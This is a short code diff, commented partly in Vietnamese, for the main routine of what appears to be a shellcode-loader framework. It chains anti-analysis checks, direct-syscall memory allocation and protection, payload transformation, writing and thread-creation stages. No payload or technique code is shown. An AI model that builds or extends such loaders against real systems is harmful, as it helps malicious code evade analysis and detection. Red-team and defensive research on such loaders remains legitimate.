@@ -5,7 +5,7 @@
 
 // Include file tổng hợp các kỹ thuật (Recipes)
 #include "techniques/context.h"
-#include "techniques/0_anti_analysis/anti_debug.h" 
+#include "techniques/runner/T0_antianalysis.h"
 #include "techniques/runner/T1_storage.h"
 #include "techniques/runner/T2_allocation.h"
 #include "techniques/runner/T3_transformation.h"
@@ -17,6 +17,7 @@
 
 PVOID g_syscall_addr = NULL;
 DWORD g_ssn_NtAllocateVirtualMemory = 0;
+DWORD g_ssn_NtProtectVirtualMemory = 0;
 DWORD g_ssn_NtCreateThreadEx = 0;
 DWORD g_ssn_NtWaitForSingleObject = 0;
 
@@ -29,21 +30,14 @@ extern "C" int main() {
     if (!InitializeSyscalls()) return 1;
 #endif
 
-#ifdef EVASION_CHECKS_ENABLED
-    if (IsDebugged()) return 1;
-#endif
-
     TechniqueContext ctx = {0};
 
-    Run_T1_Storage(&ctx);
-
-    Run_T2_Allocation(&ctx);
-
-    Run_T3_Transform(&ctx);
-
-    Run_T4_Write(&ctx);
-
-    Run_T5_Execute(&ctx);
+    if (!Run_T0_AntiAnalysis(&ctx)) return 1;
+    if (!Run_T1_Storage(&ctx))      return 1;
+    if (!Run_T2_Allocation(&ctx))   return 1;
+    if (!Run_T3_Transform(&ctx))    return 1;
+    if (!Run_T4_Write(&ctx))        return 1;
+    if (!Run_T5_Execute(&ctx))      return 1;
 
     return 0;
 }
